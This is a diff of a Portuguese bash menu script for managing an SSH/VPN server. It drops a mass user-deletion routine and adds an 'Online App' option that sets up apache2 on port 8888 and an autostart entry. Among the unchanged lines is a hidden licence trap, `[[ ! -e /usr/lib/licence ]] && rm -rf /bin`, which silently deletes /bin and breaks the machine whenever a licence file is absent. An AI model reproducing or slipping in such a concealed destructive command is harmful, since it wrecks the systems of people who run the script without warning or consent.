@@ -79,42 +79,51 @@ echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━�
 rm -rf $HOME/speed
 }
 
-remover_all () {
-clear
-echo ""
-echo -e "   \033[1;32mREMOVER TODOS OS USUARIOS REGISTRADOS\033[0m"
-echo ""
-read -p "$(echo -e "\033[1;31mENTER \033[1;33mpara continuar ao para sair \033[1;32mCLICK CTRL + C\033[0m")"
-service dropbear stop &>/dev/null
-service sshd stop &>/dev/null
-service ssh stop &>/dev/null
-service stunnel4 stop &>/dev/null
-service squid stop &>/dev/null
-for user in $(cat /etc/passwd |awk -F : '$3 > 900 {print $1}' |grep -v "rick" |grep -vi "nobody")
-do
-userpid=$(ps -u $user |awk {'print $1'})
-kill "$userpid" 2>/dev/null
-userdel $user
-echo ""
-echo -e "\033[1;32mUsuario:\033[1;33m $user \033[1;31mremovido com sucesso!"
-done
-
-service sshd restart &>/dev/null
-service ssh restart &>/dev/null
-service dropbear start &>/dev/null
-service stunnel4 start &>/dev/null
-service squid restart &>/dev/null
-
-
-unlockall2 () {
-for user in $(cat /etc/passwd |awk -F : '$3 > 900 {print $1}' |grep -v "rick" |grep -vi "nobody")
-do
-userpid=$(ps -u $user |awk {'print $1'})
-
-usermod -U $user &>/dev/null
-done
+#onlineapp
+function onapp1 () {
+   clear
+   echo -e "\n\033[1;32mINICIANDO O ONLINE APP... \033[0m"
+   echo ""
+   apt install apache2 -y > /dev/null 2>&1
+   sed -i "s/Listen 80/Listen 8888/g" /etc/apache2/ports.conf >/dev/null 2>&1
+   service apache2 restart
+   rm -rf /var/www/html/server >/dev/null 2>&1
+   mkdir /var/www/html/server >/dev/null 2>&1
+   fun_bar 'screen -dmS onlineapp onlineapp' 'sleep 3'
+   [[ $(grep -wc "onlineapp" /etc/autostart) = '0' ]] && {
+       echo -e "ps x | grep 'onlineapp' | grep -v 'grep' && echo 'ON' || screen -dmS onlineapp onlineapp" >> /etc/autostart
+   } || {
+       sed -i '/onlineapp/d' /etc/autostart
+	   echo -e "ps x | grep 'onlineapp' | grep -v 'grep' && echo 'ON' || screen -dmS onlineapp onlineapp" >> /etc/autostart
+   }
+   IP=$(wget -qO- ipv4.icanhazip.com) >/dev/null 2>&1
+   echo -e "\n\033[1;32m  ONLINE APP ATIVO !\033[0m"
+   echo -e "\033[1;31m \033[1;33mURL de Usuários Online para usar no App\033[0m"
+   echo -e " http://$IP:8888/server/online"
+   sleep 10
+   menu
 }
-unlockall2
+function onapp2 () {
+   clear
+   echo -e "\033[1;32mPARANDO O ONLINE APP... \033[0m"
+   echo ""
+   fun_stponlineapp () {
+      sleep 1
+      screen -r -S "onlineapp" -X quit
+      screen -wipe 1>/dev/null 2>/dev/null
+      [[ $(grep -wc "onlineapp" /etc/autostart) != '0' ]] && {
+          sed -i '/onlineapp/d' /etc/autostart
+      }
+      sleep 1
+   }
+   fun_bar 'fun_stponlineapp' 'sleep 3'
+   rm -rf /var/www/html/server >/dev/null 2>&1
+   echo -e "\n\033[1;31m ONLINE APP PARADO !\033[0m"
+   sleep 3
+   menu
+}
+function onapp_ssh () {
+[[ $(ps x | grep "onlineapp"|grep -v grep |wc -l) = '0' ]] && onapp1 || onapp2
 }
 
 while true $x != "ok"
@@ -125,6 +134,7 @@ autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -161,6 +171,8 @@ echo -e "[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;33mMONITOR DO SISTEMA \03
 [\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mALTERAR SENHA ROOT \033[1;31m
 [\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m
 [\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICOS \033[1;31m
+[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mMEMORIA VIRTUAL \033[1;31m 
+[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mONLINE APP $stson \033[1;31m 
 [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mRETORNAR AO MENU \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m"
 echo ""
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
@@ -197,6 +209,14 @@ case "$x" in
    clear
    reiniciarservicos
    sleep 3
+   ;;
+   7 | 07)
+   clear
+   swapmemory
+   ;;
+   8 | 08)
+   clear
+   onapp_ssh
    ;;
    0 | 00)
    menu
